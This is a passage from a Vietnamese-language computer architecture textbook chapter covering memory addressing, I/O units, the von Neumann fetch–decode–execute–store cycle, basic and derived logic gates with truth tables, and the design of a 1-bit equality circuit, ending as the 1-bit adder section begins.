<p>Dung lượng bộ nhớ thay đổi tùy theo hệ thống. Tuy nhiên, ISA của hệ thống sẽ giới hạn phạm vi địa chỉ mà nó có thể biểu diễn. Trong các hệ thống hiện đại, đơn vị nhỏ nhất có thể định địa chỉ trong bộ nhớ là một byte (8 bit), do đó mỗi địa chỉ tương ứng với một vị trí bộ nhớ duy nhất lưu một byte. Vì vậy, các kiến trúc 32-bit thường hỗ trợ không gian địa chỉ tối đa là 2³², tương ứng với 4 gigabyte (GiB) bộ nhớ có thể định địa chỉ.</p>
<p>Thuật ngữ <strong>memory</strong> đôi khi được dùng để chỉ toàn bộ hệ phân cấp lưu trữ trong hệ thống. Nó có thể bao gồm các thanh ghi trong đơn vị xử lý cũng như các thiết bị lưu trữ thứ cấp như ổ cứng HDD hoặc ổ SSD. Trong <a href="C5-Arch/../C11-MemHierarchy/index.html#_storage_and_the_memory_hierarchy">Chương Bộ nhớ và Hệ phân cấp lưu trữ</a>, ta sẽ thảo luận chi tiết về hệ phân cấp bộ nhớ. Hiện tại, ta sử dụng thuật ngữ &quot;memory&quot; để chỉ bộ nhớ trong <strong>random access memory</strong> (RAM – &quot;bộ nhớ truy cập ngẫu nhiên&quot;) — loại bộ nhớ có thể được truy cập trực tiếp bởi CPU. RAM được gọi là truy cập ngẫu nhiên vì mọi vị trí lưu trữ trong RAM (địa chỉ) đều có thể được truy cập trực tiếp. Có thể hình dung RAM như một mảng tuyến tính các địa chỉ, trong đó mỗi địa chỉ tương ứng với một byte bộ nhớ.</p>
<blockquote>
<p>Kích thước từ qua các thời kỳ<br />
<strong>Word size</strong> (kích thước từ), được định nghĩa bởi ISA, là số bit của kích thước dữ liệu chuẩn mà bộ xử lý xử lý như một đơn vị duy nhất. Kích thước từ chuẩn đã thay đổi theo thời gian. Với EDVAC, kích thước từ được đề xuất là 30 bit. Trong thập niên 1950, kích thước từ 36 bit khá phổ biến. Với sự ra đời của IBM 360 vào thập niên 1960, kích thước từ bắt đầu được chuẩn hóa, và dần mở rộng từ 16 bit, đến 32 bit, và đến 64 bit như ngày nay. Nếu bạn xem xét kiến trúc Intel kỹ hơn, bạn có thể nhận thấy dấu vết của một số quyết định cũ, vì kiến trúc 32-bit và 64-bit được thêm vào như phần mở rộng của kiến trúc gốc 16-bit.</p>
</blockquote>
<h3 id="525-Đơn-vị-vàora-input-and-output--io-units"><a class="header" href="#525-Đơn-vị-vàora-input-and-output--io-units">5.2.5. Đơn vị vào/ra (Input and Output – I/O Units)</a></h3>
<p>Trong khi các đơn vị điều khiển, xử lý và bộ nhớ tạo thành nền tảng của máy tính, thì các đơn vị vào và ra cho phép máy tính tương tác với thế giới bên ngoài. Cụ thể, chúng cung cấp cơ chế để nạp lệnh và dữ liệu chương trình vào bộ nhớ, lưu dữ liệu ra bên ngoài bộ nhớ, và hiển thị kết quả cho người dùng.</p>
<p><strong>Input unit</strong> (đơn vị vào) bao gồm tập hợp các thiết bị cho phép người dùng hoặc chương trình đưa dữ liệu từ thế giới bên ngoài vào máy tính. Các thiết bị vào phổ biến nhất hiện nay là bàn phím và chuột. Camera và micro cũng là những ví dụ khác.</p>
<p><strong>Output unit</strong> (đơn vị ra) bao gồm tập hợp các thiết bị truyền kết quả tính toán từ máy tính ra thế giới bên ngoài hoặc lưu kết quả ra ngoài bộ nhớ trong. Ví dụ, màn hình là một thiết bị ra phổ biến. Các thiết bị ra khác bao gồm loa và thiết bị phản hồi xúc giác (haptics).</p>
<p>Một số thiết bị hiện đại, như màn hình cảm ứng, hoạt động như cả thiết bị vào và ra, cho phép người dùng vừa nhập dữ liệu vừa nhận phản hồi từ cùng một thiết bị tích hợp.</p>
<p>Ổ cứng thể rắn (SSD) và ổ cứng cơ học (HDD) cũng là ví dụ về thiết bị vừa vào vừa ra. Các thiết bị lưu trữ này hoạt động như thiết bị vào khi lưu trữ các tệp thực thi chương trình mà hệ điều hành nạp vào bộ nhớ để chạy, và hoạt động như thiết bị ra khi lưu trữ các tệp chứa kết quả chương trình.</p>
<h3 id="526-máy-von-neumann-hoạt-động-thực-thi-một-chương-trình"><a class="header" href="#526-máy-von-neumann-hoạt-động-thực-thi-một-chương-trình">5.2.6. Máy von Neumann hoạt động: Thực thi một chương trình</a></h3>
<p>Năm đơn vị cấu thành kiến trúc von Neumann phối hợp với nhau để triển khai chu trình <strong>fetch–decode–execute–store</strong> (nạp–giải code–thực thi–lưu trữ) nhằm thực thi các lệnh chương trình. Chu trình này bắt đầu với lệnh đầu tiên của chương trình và lặp lại cho đến khi chương trình kết thúc:</p>
<ol>
<li>
<p><strong>Đơn vị điều khiển <em>nạp</em> lệnh tiếp theo từ bộ nhớ</strong>.<br />
Đơn vị điều khiển có một thanh ghi đặc biệt gọi là program counter (PC – &quot;bộ đếm chương trình&quot;), chứa địa chỉ của lệnh tiếp theo cần nạp. Nó đặt địa chỉ này lên <em>address bus</em> và gửi lệnh <em>read</em> lên <em>control bus</em> đến đơn vị bộ nhớ. Đơn vị bộ nhớ đọc các byte tại địa chỉ được chỉ định và gửi chúng đến đơn vị điều khiển qua <em>data bus</em>. Instruction register (IR – &quot;thanh ghi lệnh&quot;) lưu các byte của lệnh nhận được từ đơn vị bộ nhớ. Đơn vị điều khiển cũng tăng giá trị của PC để lưu địa chỉ của lệnh tiếp theo cần nạp.</p>
</li>
<li>
<p><strong>Đơn vị điều khiển <em>giải code</em> lệnh được lưu trong IR</strong>.<br />
Nó giải code các bit lệnh để xác định phép toán cần thực hiện và vị trí của các toán hạng. Các bit lệnh được giải code dựa trên định nghĩa code hóa của ISA. Đơn vị điều khiển cũng nạp giá trị toán hạng từ các vị trí của chúng (từ thanh ghi CPU, bộ nhớ, hoặc được code hóa trong lệnh), làm đầu vào cho đơn vị xử lý.</p>
</li>
<li>
<p><strong>Đơn vị xử lý <em>thực thi</em> lệnh</strong>.<br />
ALU thực hiện phép toán của lệnh trên các toán hạng dữ liệu.</p>
</li>
<li>
<p><strong>Đơn vị điều khiển <em>lưu trữ</em> kết quả vào bộ nhớ</strong>.<br />
Kết quả của việc thực thi lệnh bởi đơn vị xử lý được lưu vào bộ nhớ. Đơn vị điều khiển ghi kết quả vào bộ nhớ bằng cách đặt giá trị kết quả lên <em>data bus</em>, đặt địa chỉ vị trí lưu trữ lên <em>address bus</em>, và gửi lệnh <em>write</em> lên <em>control bus</em>. Khi nhận được, đơn vị bộ nhớ ghi giá trị vào địa chỉ bộ nhớ được chỉ định.</p>
</li>
</ol>
<p>Các đơn vị vào và ra không tham gia trực tiếp vào việc thực thi lệnh chương trình. Thay vào đó, chúng hỗ trợ quá trình thực thi bằng cách nạp lệnh và dữ liệu chương trình, và lưu trữ hoặc hiển thị kết quả tính toán của chương trình.</p>
<p>Hình 2 và Hình 3 minh họa bốn pha thực thi lệnh trong kiến trúc von Neumann với ví dụ lệnh cộng, trong đó các toán hạng được lưu trong các thanh ghi CPU. Trong pha <em>fetch</em>, đơn vị điều khiển đọc lệnh tại địa chỉ bộ nhớ được lưu trong PC (1234). Nó gửi địa chỉ lên address bus và lệnh READ lên control bus. Đơn vị bộ nhớ nhận yêu cầu, đọc giá trị tại địa chỉ 1234, và gửi đến đơn vị điều khiển qua data bus. Đơn vị điều khiển lưu các byte lệnh vào thanh ghi IR và cập nhật PC với địa chỉ của lệnh tiếp theo (1238 trong ví dụ này).</p>
<p>Trong pha <em>decode</em>, đơn vị điều khiển truyền các bit lệnh chỉ định phép toán đến ALU của đơn vị xử lý, và sử dụng các bit lệnh chỉ định thanh ghi chứa toán hạng để đọc giá trị toán hạng từ các thanh ghi vào ALU (giá trị toán hạng là 3 và 4 trong ví dụ này).</p>
<p>Trong pha <em>execute</em>, ALU thực hiện phép toán trên các toán hạng để tạo ra kết quả (3 + 4 = 7).</p>
<p>Cuối cùng, trong pha <em>store</em>, đơn vị điều khiển ghi kết quả (7) từ đơn vị xử lý vào đơn vị bộ nhớ. Địa chỉ bộ nhớ (5678) được gửi lên address bus, lệnh WRITE được gửi lên control bus, và giá trị dữ liệu cần lưu (7) được gửi lên data bus. Đơn vị bộ nhớ nhận yêu cầu và lưu giá trị 7 vào địa chỉ bộ nhớ 5678. Trong ví dụ này, ta giả định rằng địa chỉ bộ nhớ để lưu kết quả được code hóa trong các bit của lệnh.</p>
<p><img src="C5-Arch/_images/vonFD.png" alt="This figure of von Neumann execution shows the processing, control and memory units in each of the four stages of execution. Each unit is shown as a box, with buses shown as lines running below the boxes to which each box is connected." /></p>
<p><strong>Hình 2. Các pha nạp và giải code trong quá trình thực thi lệnh cộng của kiến trúc von Neumann.</strong><br />
Toán hạng, kết quả và địa chỉ bộ nhớ được biểu diễn dưới dạng giá trị thập phân, nội dung bộ nhớ được biểu diễn dưới dạng nhị phân.</p>
<p><img src="C5-Arch/_images/vonES.png" alt="This figure of von Neumann execution shows the processing, control and memory units in each of the four stages of execution. Each unit is shown as a box, with buses shown as lines running below the boxes to which each box is connected." /></p>
<p><strong>Hình 3. Các pha thực thi và lưu trữ trong quá trình thực thi lệnh cộng của kiến trúc von Neumann.</strong><br />
Toán hạng, kết quả và địa chỉ bộ nhớ được biểu diễn dưới dạng giá trị thập phân, nội dung bộ nhớ được biểu diễn dưới dạng nhị phân.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="53-cổng-logic"><a class="header" href="#53-cổng-logic">5.3. Cổng Logic</a></h2>
<p><strong>Logic gates</strong> (cổng logic) là các khối xây dựng cơ bản của mạch số dùng để triển khai các chức năng số học, điều khiển và lưu trữ trong máy tính số. Việc thiết kế các mạch số phức tạp đòi hỏi mức độ trừu tượng cao: người thiết kế tạo ra các mạch đơn giản thực hiện chức năng cơ bản từ một tập nhỏ các cổng logic cơ bản; các mạch đơn giản này, sau khi được trừu tượng hóa khỏi phần triển khai chi tiết, sẽ được dùng làm khối xây dựng để tạo ra các mạch phức tạp hơn (các mạch đơn giản được kết hợp lại để tạo ra mạch mới có chức năng phức tạp hơn); các mạch phức tạp hơn này lại có thể được trừu tượng hóa tiếp và dùng làm khối xây dựng cho các chức năng phức tạp hơn nữa; và cứ thế tiếp tục để xây dựng nên các thành phần xử lý, lưu trữ và điều khiển hoàn chỉnh của một bộ xử lý.</p>
<blockquote>
<p>Transistors</p>
</blockquote>
<p>Các cổng logic được tạo ra từ các transistor được khắc lên vật liệu bán dẫn (ví dụ: chip silicon). Transistor hoạt động như công tắc điều khiển dòng điện chạy qua chip. Một transistor có thể chuyển trạng thái giữa bật và tắt (tương ứng với đầu ra điện áp cao hoặc thấp). Trạng thái đầu ra của nó phụ thuộc vào trạng thái hiện tại và trạng thái đầu vào (điện áp cao hoặc thấp). Các giá trị nhị phân được code hóa bằng điện áp cao (1) và thấp (0), và các cổng logic được triển khai bằng cách sắp xếp một số transistor để thực hiện hành động chuyển mạch trên các đầu vào nhằm tạo ra đầu ra của cổng logic. Số lượng transistor có thể đặt trên một mạch tích hợp (chip) là một chỉ số sơ bộ về sức mạnh của nó; càng nhiều transistor trên mỗi chip thì càng có nhiều khối xây dựng để triển khai nhiều chức năng hoặc lưu trữ hơn.</p>
<h3 id="531-cổng-logic-cơ-bản"><a class="header" href="#531-cổng-logic-cơ-bản">5.3.1. Cổng Logic Cơ Bản</a></h3>
<p>Ở cấp độ thấp nhất, tất cả các mạch đều được xây dựng bằng cách liên kết các cổng logic với nhau. Cổng logic thực hiện các phép toán boolean trên các toán hạng boolean (0 hoặc 1). Bộ ba cổng <strong>AND</strong>, <strong>OR</strong> và <strong>NOT</strong> tạo thành một tập đầy đủ các cổng logic từ đó có thể xây dựng bất kỳ mạch nào. Một cổng logic nhận một (NOT) hoặc hai (AND và OR) giá trị đầu vào nhị phân và tạo ra một giá trị đầu ra nhị phân là kết quả của phép toán logic từng bit trên đầu vào. Ví dụ, đầu vào 0 vào cổng NOT sẽ cho ra 1 (1 là NOT(0)). Một <strong>truth table</strong> (bảng chân trị – &quot;bảng giá trị logic&quot;) của một phép toán logic liệt kê giá trị kết quả của phép toán với từng tổ hợp đầu vào. Bảng 1 dưới đây trình bày bảng chân trị của các cổng logic AND, OR và NOT.</p>
<div class="table-wrapper"><table><thead><tr><th>A</th><th>B</th><th>A AND B</th><th>A OR B</th><th>NOT A</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td></tr>
<tr><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td></tr>
<tr><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td></tr>
</tbody></table>
</div>
<p>: Bảng 1. Bảng chân trị cho các phép toán logic cơ bản.</p>
<p>Hình 1 minh họa cách các kiến trúc sư máy tính biểu diễn các cổng logic này trong sơ đồ mạch.</p>
<p><img src="C5-Arch/_images/gates.png" alt="AND, OR, and NOT logic gates." /></p>
<p><strong>Hình 1. Các cổng logic AND, OR và NOT với đầu vào 1-bit tạo ra đầu ra 1-bit.</strong></p>
<p>Phiên bản nhiều bit của một cổng logic (với đầu vào và đầu ra <em>M</em>-bit) là một mạch rất đơn giản được xây dựng từ <em>M</em> cổng logic 1-bit. Mỗi bit riêng lẻ trong giá trị đầu vào <em>M</em>-bit được đưa vào một cổng logic 1-bit khác nhau, và mỗi cổng sẽ tạo ra bit đầu ra tương ứng trong kết quả <em>M</em>-bit. Ví dụ, Hình 2 minh họa một mạch AND 4-bit được xây dựng từ bốn cổng AND 1-bit.</p>
<p><img src="C5-Arch/_images/4bitand.png" alt="4-bit AND gate built from 1-bit AND gates." /></p>
<p><strong>Hình 2. Mạch AND 4-bit được xây dựng từ bốn cổng AND 1-bit.</strong></p>
<p>Loại mạch đơn giản này – chỉ mở rộng độ rộng bit của đầu vào và đầu ra cho một cổng logic – thường được gọi là cổng <em>M</em>-bit, với <em>M</em> là số bit đầu vào và đầu ra.</p>
<h3 id="532-các-cổng-logic-khác"><a class="header" href="#532-các-cổng-logic-khác">5.3.2. Các Cổng Logic Khác</a></h3>
<p>Mặc dù tập hợp các cổng logic gồm AND, OR và NOT là đủ để triển khai bất kỳ mạch nào, vẫn có một số cổng logic cơ bản khác thường được sử dụng trong thiết kế mạch số. Các cổng bổ sung này bao gồm:</p>
<ul>
<li><strong>NAND</strong> (phủ định của A AND B),</li>
<li><strong>NOR</strong> (phủ định của A OR B),</li>
<li><strong>XOR</strong> (exclusive OR – &quot;hoặc độc quyền&quot;).</li>
</ul>
<p>Bảng chân trị của các cổng này được trình bày trong Bảng 2.</p>
<div class="table-wrapper"><table><thead><tr><th>A</th><th>B</th><th>A NAND B</th><th>A NOR B</th><th>A XOR B</th></tr></thead><tbody>
<tr><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td></tr>
<tr><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td></tr>
<tr><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td></tr>
</tbody></table>
</div>
<p>: Bảng 2. Bảng chân trị của các cổng NAND, NOR và XOR.</p>
<p>Các cổng NAND, NOR và XOR thường xuất hiện trong sơ đồ mạch, như minh họa trong Hình 3.</p>
<p><img src="C5-Arch/_images/nandnorxor.png" alt="XOR, NAND, and NOR logic gates." /></p>
<p><strong>Hình 3. Các cổng logic NAND, NOR và XOR.</strong></p>
<p>Vòng tròn ở cuối các cổng NAND và NOR biểu thị phép phủ định hoặc NOT. Ví dụ, cổng NOR trông giống như cổng OR với một vòng tròn ở cuối, biểu thị rằng NOR là phủ định của OR.</p>
<blockquote>
<p>Tập hợp tối thiểu của các cổng logic</p>
</blockquote>
<p>Các cổng NAND, NOR và XOR không bắt buộc phải có để xây dựng mạch, nhưng chúng là các cổng bổ sung được thêm vào tập {AND, OR, NOT} và thường được sử dụng trong thiết kế mạch. Bất kỳ cổng nào trong số này đều có thể được triển khai từ transistor (khối xây dựng của cổng logic), hoặc từ tổ hợp các cổng logic khác.</p>
<p>Trong tập hợp mở rộng {AND, OR, NOT, NAND, NOR, XOR}, tồn tại một số tập con tối thiểu đủ để xây dựng bất kỳ mạch nào. Ví dụ, tập con {AND, NOT} là một tập tối thiểu: biểu thức (A OR B) tương đương với NOT(NOT(A) AND NOT(B)). Tuy nhiên, thay vì sử dụng tập tối thiểu, ta sử dụng tập {AND, OR, NOT} vì đây là tập dễ hiểu nhất.</p>
<p>Vì NAND, NOR và XOR không bắt buộc, nên chức năng của chúng có thể được triển khai bằng cách kết hợp các cổng AND, OR và NOT để tạo thành các mạch thực hiện chức năng tương ứng. Ví dụ, NOR có thể được xây dựng bằng cách kết hợp một cổng OR và một cổng NOT: <code>(A NOR B) ≡ NOT(A OR B)</code>, như minh họa trong Hình 4.</p>
<p><img src="C5-Arch/_images/nornotor.png" alt="NOR built from OR and NOT gates: OR output is input to NOT gate" /></p>
<p><strong>Hình 4. Cổng NOR có thể được triển khai bằng cách kết hợp một cổng OR và một cổng NOT.</strong> Các đầu vào A và B được đưa qua cổng OR, và đầu ra của cổng OR được đưa vào cổng NOT (NOR là phủ định của OR).</p>
<p>Các chip mạch tích hợp hiện đại ngày nay được xây dựng bằng công nghệ CMOS, trong đó cổng NAND được sử dụng làm khối xây dựng cơ bản của các mạch trên chip. Cổng NAND tự nó tạo thành một tập hợp tối thiểu khác của các cổng logic đầy đủ.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="54-mạch-điện"><a class="header" href="#54-mạch-điện">5.4. Mạch điện</a></h2>
<p>Các mạch số (digital circuits – &quot;mạch số&quot;) thực hiện các chức năng cốt lõi của kiến trúc hệ thống. Chúng triển khai <strong>Instruction Set Architecture</strong> (ISA – &quot;kiến trúc tập lệnh&quot;) dưới dạng phần cứng, đồng thời đảm nhiệm chức năng lưu trữ và điều khiển trong toàn bộ hệ thống.</p>
<p>Thiết kế mạch số đòi hỏi phải áp dụng nhiều cấp độ trừu tượng: các mạch thực hiện chức năng phức tạp được xây dựng từ các mạch nhỏ hơn đảm nhiệm một phần chức năng, và các mạch nhỏ này lại được xây dựng từ những mạch đơn giản hơn nữa, cho đến cấp độ các cổng logic cơ bản – là khối xây dựng nền tảng của mọi mạch số. <a href="C5-Arch/circuits.html#Figcircuitabstraction">Hình 1</a> minh họa một mạch được trừu tượng hóa khỏi phần triển khai chi tiết. Mạch được biểu diễn dưới dạng một <em>hộp đen</em> (black box – &quot;hộp đen&quot;) được gắn nhãn theo chức năng hoặc tên gọi, chỉ hiển thị đầu vào và đầu ra, còn phần triển khai bên trong được ẩn đi.</p>
<p><img src="C5-Arch/_images/circuit.png" alt="an example circuit" /></p>
<p><strong>Hình 1. Một mạch được triển khai bằng cách liên kết các mạch con và cổng logic.</strong> Chức năng của nó được trừu tượng hóa khỏi phần triển khai chi tiết và có thể được sử dụng như một khối xây dựng để tạo ra các mạch khác.</p>
<p>Có ba loại chính của các khối xây dựng mạch:</p>
<ul>
<li>mạch số học / logic,</li>
<li>mạch điều khiển,</li>
<li>và mạch lưu trữ.</li>
</ul>
<p>Ví dụ, một vi mạch bộ xử lý (processor integrated circuit – &quot;vi mạch xử lý&quot;) chứa cả ba loại mạch con này: tập hợp các thanh ghi sử dụng mạch lưu trữ; chức năng cốt lõi để thực hiện các phép toán số học và logic sử dụng mạch số học và logic; và các mạch điều khiển được sử dụng xuyên suốt trong bộ xử lý để điều khiển quá trình thực thi lệnh cũng như việc nạp và lưu giá trị vào các thanh ghi.</p>
<p>Trong phần này, ta sẽ tìm hiểu ba loại mạch nói trên, bắt đầu từ cách thiết kế một mạch cơ bản từ các cổng logic, sau đó là cách xây dựng các mạch lớn hơn từ các mạch cơ bản và cổng logic.</p>
<ul>
<li><a href="C5-Arch/arithlogiccircs.html#_arithmetic_and_logic_circuits">Mạch Số học / Logic</a></li>
<li>Mạch Điều khiển</li>
<li>Mạch Lưu trữ</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h3 id="541-mạch-số-học-và-logic"><a class="header" href="#541-mạch-số-học-và-logic">5.4.1. Mạch Số học và Logic</a></h3>
<p>Các mạch số học và logic thực hiện các lệnh số học và logic của một ISA (instruction set architecture – &quot;kiến trúc tập lệnh&quot;) mà cùng nhau tạo thành <strong>arithmetic logic unit</strong> (ALU – &quot;bộ số học và logic&quot;) của bộ xử lý. Các mạch này cũng đảm nhiệm một phần chức năng khác trong CPU. Ví dụ, mạch số học được dùng để tăng giá trị của program counter (PC – &quot;bộ đếm chương trình&quot;) như một phần của bước đầu tiên trong quá trình thực thi lệnh, và được dùng để tính toán địa chỉ bộ nhớ bằng cách kết hợp các bit toán hạng trong lệnh với giá trị của các thanh ghi.</p>
<p>Thiết kế mạch thường bắt đầu bằng việc triển khai phiên bản 1-bit của một mạch đơn giản từ các cổng logic. Mạch 1-bit này sau đó được dùng làm khối xây dựng để triển khai phiên bản <em>M</em>-bit của mạch. Các bước thiết kế một mạch 1-bit từ các cổng logic cơ bản gồm:</p>
<ol>
<li>
<p>Thiết kế bảng chân trị (truth table – &quot;bảng chân trị&quot;) cho mạch: xác định số lượng đầu vào và đầu ra, và thêm một dòng cho mỗi tổ hợp của các bit đầu vào, chỉ rõ giá trị của các bit đầu ra.</p>
</li>
<li>
<p>Dựa vào bảng chân trị, viết biểu thức cho các trường hợp đầu ra của mạch bằng 1, sử dụng các phép toán AND, OR, NOT trên các giá trị đầu vào.</p>
</li>
<li>
<p>Chuyển biểu thức thành chuỗi các cổng logic, trong đó mỗi cổng nhận đầu vào từ đầu vào của mạch hoặc từ đầu ra của một cổng logic trước đó.</p>
</li>
</ol>
<p>Ta sẽ theo các bước trên để triển khai một mạch <em>equals</em> (so sánh bằng) 1-bit: phép so sánh từng bit <code>A == B</code> sẽ cho ra 1 khi giá trị của <code>A</code> và <code>B</code> giống nhau, và cho ra 0 nếu khác nhau.</p>
<p>Đầu tiên, thiết kế bảng chân trị cho mạch:</p>
<p>+----------------------+----------------------+-----------------------+
| A                    | B                    | A == B output         |
+======================+======================+=======================+
| 0                    | 0                    | 1                     |
+----------------------+----------------------+-----------------------+
| 0                    | 1                    | 0                     |
+----------------------+----------------------+-----------------------+
| 1                    | 0                    | 0                     |
+----------------------+----------------------+-----------------------+
| 1                    | 1                    | 1                     |
+----------------------+----------------------+-----------------------+</p>
<p>: Bảng 1. Bảng chân trị cho mạch so sánh bằng đơn giản</p>
<p>Tiếp theo, viết biểu thức cho các trường hợp <code>A == B</code> bằng 1, sử dụng các phép toán AND, OR, NOT trên <code>A</code> và <code>B</code>. Trước tiên, xét từng dòng trong bảng chân trị mà đầu ra là 1, bắt đầu với dòng đầu tiên:</p>
<p>+----------------------+----------------------+-----------------------+
| A                    | B                    | A == B                |
+======================+======================+=======================+
| 0                    | 0                    | 1                     |
+----------------------+----------------------+-----------------------+</p>
<p>Với các giá trị đầu vào ở dòng này, ta xây dựng một <em>conjunction</em> (phép hội – kết hợp bằng AND) của các biểu thức đầu vào sao cho kết quả là 1. Một <strong>conjunction</strong> kết hợp các biểu thức con có giá trị 0 hoặc 1 bằng phép AND, và chỉ cho ra 1 khi tất cả các biểu thức con đều bằng 1. Bắt đầu bằng cách biểu diễn khi nào mỗi đầu vào bằng 1:</p>
<blockquote>
<p>NOT(A)    # bằng 1 khi A là 0<br />
NOT(B)    # bằng 1 khi B là 0</p>
</blockquote>
<p>Sau đó, kết hợp chúng bằng AND để tạo biểu thức cho trường hợp dòng này trong bảng chân trị cho ra 1:</p>
<blockquote>
<p>NOT(A) AND NOT(B)    # bằng 1 khi cả A và B đều là 0</p>
</blockquote>
<p>Ta thực hiện tương tự với dòng cuối trong bảng chân trị, nơi đầu ra cũng là 1:</p>
<p>+----------------------+----------------------+-----------------------+
| A                    | B                    | A == B                |
+======================+======================+=======================+
| 1                    | 1                    | 1                     |
+----------------------+----------------------+-----------------------+</p>
<blockquote>
<p>A AND B   # bằng 1 khi cả A và B đều là 1</p>
</blockquote>
<p>Cuối cùng, tạo một <strong>disjunction</strong> (phép tuyển – kết hợp bằng OR) của các conjunction tương ứng với các dòng trong bảng chân trị có đầu ra bằng 1:</p>
<blockquote>
<p>(NOT(A) AND NOT(B)) OR (A AND B)  # bằng 1 khi A và B đều là 0 hoặc đều là 1</p>
</blockquote>
<p>Tại thời điểm này, ta đã có một biểu thức cho <code>A == B</code> có thể được chuyển thành mạch. Ở bước này, các kỹ sư thiết kế mạch thường áp dụng các kỹ thuật để đơn giản hóa biểu thức nhằm tạo ra biểu thức tương đương tối giản (biểu thức có ít toán tử nhất và/hoặc độ dài đường đi qua các cổng ngắn nhất). Việc tối giản biểu thức cần được thực hiện cẩn thận để đảm bảo tính tương đương. Có các phương pháp chính quy để tối giản mạch, nhưng nằm ngoài phạm vi của chương này; tuy nhiên, ta sẽ sử dụng một vài phương pháp heuristic khi phát triển mạch.</p>
<p>Trong ví dụ này, ta sẽ chuyển trực tiếp biểu thức trên thành mạch. Có thể ta sẽ muốn thay thế <code>(NOT(A) AND NOT(B))</code> bằng <code>(A NAND B)</code>, nhưng cần lưu ý rằng hai biểu thức này <strong>không</strong> tương đương: chúng không cho ra kết quả giống nhau với mọi tổ hợp của A và B. Ví dụ, khi A là 1 và B là 0, <code>(A == B)</code> là 0 còn <code>(A NAND B)</code> là 1.</p>
<p>Để chuyển biểu thức thành mạch, bắt đầu từ biểu thức trong cùng và làm việc ra ngoài (biểu thức trong cùng sẽ là các cổng đầu tiên, đầu ra của chúng sẽ là đầu vào cho các cổng tiếp theo). Bộ cổng đầu tiên sẽ là các cổng NOT cho các đầu vào A và B. Tiếp theo, với mỗi conjunction, tạo phần mạch đưa các giá trị đầu vào vào cổng AND. Đầu ra của các cổng AND sau đó được đưa vào cổng OR đại diện cho disjunction. Mạch kết quả được minh họa trong Hình 1.</p>
<p><img src="C5-Arch/_images/1biteq.png" alt="a 1-bit equality circuit" /></p>
<p><strong>Hình 1. Mạch so sánh bằng 1-bit (A == B) được xây dựng từ các cổng logic AND, OR và NOT.</strong></p>
<p>Để kiểm tra tính đúng đắn của mạch này, ta mô phỏng tất cả các tổ hợp đầu vào có thể của A và B qua mạch, và xác minh rằng đầu ra của mạch khớp với dòng tương ứng trong bảng chân trị của phép so sánh (A == B). Ví dụ, nếu A là 0 và B là 0, hai cổng NOT sẽ đảo giá trị của chúng trước khi được đưa vào cổng AND phía trên, nên đầu vào của cổng AND này là (1, 1), cho ra đầu ra là 1, đây là đầu vào phía trên của cổng OR. Các giá trị A và B (0, 0) được đưa trực tiếp vào cổng AND phía dưới, cho ra đầu ra là 0 từ cổng AND phía dưới, đây là đầu vào phía dưới của cổng OR. Do đó, cổng OR nhận đầu vào là (1, 0) và cho ra giá trị 1. Vậy, khi A và B đều bằng 0, mạch cho ra đầu ra đúng là 1. <a href="C5-Arch/arithlogiccircs.html#Fig1bitequalcircuitex">Hình 2</a> minh họa ví dụ này.</p>
<p><img src="C5-Arch/_images/1biteqex.png" alt="example values through a 1-bit equality circuit" /></p>
<p><strong>Hình 2. Ví dụ minh họa cách mạch so sánh bằng 1-bit tính toán (A == B).</strong> Bắt đầu với giá trị đầu vào là 0 cho A và 0 cho B, các giá trị này được truyền qua các cổng trong mạch để tính ra giá trị đầu ra đúng là 1 cho A == B.</p>
<p>Xem việc triển khai mạch so sánh bằng 1-bit như một đơn vị cho phép ta trừu tượng hóa nó khỏi phần triển khai chi tiết, từ đó dễ dàng sử dụng nó như một khối xây dựng cho các mạch khác. Ta biểu diễn phiên bản trừu tượng của mạch so sánh bằng 1-bit (hiển thị trong <a href="C5-Arch/arithlogiccircs.html#Fig1bitequal">Hình 3</a>) dưới dạng một hộp với hai đầu vào được gắn nhãn <em>A</em> và <em>B</em>, và một đầu ra duy nhất được gắn nhãn <em>A == B</em>. Các cổng bên trong thực hiện mạch so sánh bằng 1-bit được ẩn đi trong phiên bản trừu tượng này.</p>
<p><img src="C5-Arch/_images/1biteqcircuit.png" alt="1-bit equality as a circuit" /></p>
<p><strong>Hình 3. Phiên bản trừu tượng của mạch so sánh bằng 1-bit.</strong> Mạch này có thể được sử dụng như một khối xây dựng trong các mạch khác.</p>
<p>Các phiên bản 1-bit của mạch NAND, NOR và XOR cũng có thể được xây dựng tương tự, chỉ sử dụng các cổng AND, OR và NOT, bắt đầu từ bảng chân trị của chúng (Bảng 2) và áp dụng các bước giống như với mạch so sánh bằng 1-bit.</p>
<p>+-------------+-------------+-------------+-------------+-------------+
| A           | B           | A NAND B    | A NOR B     | A XOR B     |
+=============+=============+=============+=============+=============+
| 0           | 0           | 1           | 1           | 0           |
+-------------+-------------+-------------+-------------+-------------+
| 0           | 1           | 1           | 0           | 1           |
+-------------+-------------+-------------+-------------+-------------+
| 1           | 0           | 1           | 0           | 1           |
+-------------+-------------+-------------+-------------+-------------+
| 1           | 1           | 0           | 0           | 0           |
+-------------+-------------+-------------+-------------+-------------+</p>
<p>Bảng 2. Bảng chân trị cho các mạch NAND, NOR và XOR.</p>
<p>Các phiên bản nhiều bit của các mạch này được xây dựng từ nhiều phiên bản 1-bit của mạch, tương tự như cách mạch <a href="C5-Arch/gates.html#_basic_logic_gates">AND 4-bit</a> được xây dựng từ bốn mạch AND 1-bit.</p>
<h4 id="mạch-số-học"><a class="header" href="#mạch-số-học">Mạch Số học</a></h4>
<p>Các mạch số học được xây dựng theo đúng phương pháp mà ta đã dùng để xây dựng các mạch logic. Ví dụ, để xây dựng mạch cộng 1-bit, ta bắt đầu với bảng chân trị cho phép cộng từng bit, gồm hai đầu vào là A và B, và hai đầu ra: một cho tổng (SUM) của A và B, và một cho giá trị tràn (CARRY OUT). <a href="C5-Arch/arithlogiccircs.html#Table1bitadder">Bảng 3</a> hiển thị bảng chân trị kết quả cho phép cộng 1-bit.</p>
